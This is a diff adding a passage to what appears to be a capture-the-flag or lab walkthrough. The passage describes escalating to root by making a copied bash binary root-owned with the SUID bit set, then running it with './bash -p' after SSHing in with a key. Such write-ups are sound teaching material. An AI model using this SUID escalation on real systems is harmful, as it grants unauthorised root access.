@@ -96,6 +96,23 @@ Download the bash file and move it to the mount on local. ``cp ~/Downloads/bash 
 
 ``sudo chown root bash`` to make sure it's own by root user.
 
+``chmod +s bash`` to add the SUID bit permission.
+
+``chmod o+x bash`` to add excecute on everyone else,
+
+![image](https://user-images.githubusercontent.com/80155116/111904211-8aa3dc00-8aaa-11eb-95a6-bfd99ba4b81f.png)
+
+you can see i spent ages here trying to figure out how to change permission of others to executable........................
+
+``ssh -i id_rsa cappucino@$ip`` to ssh back to user,
+
+``./bash -p`` to run the shell, ``-p`` persists the permissions so it can run as root with SUID, its important!
+
+![image](https://user-images.githubusercontent.com/80155116/111904346-61d01680-8aab-11eb-9869-9ae474023bdb.png)
+
+![image](https://user-images.githubusercontent.com/80155116/111904353-6ac0e800-8aab-11eb-8193-dd65f2167077.png)
+
+
 
 
 
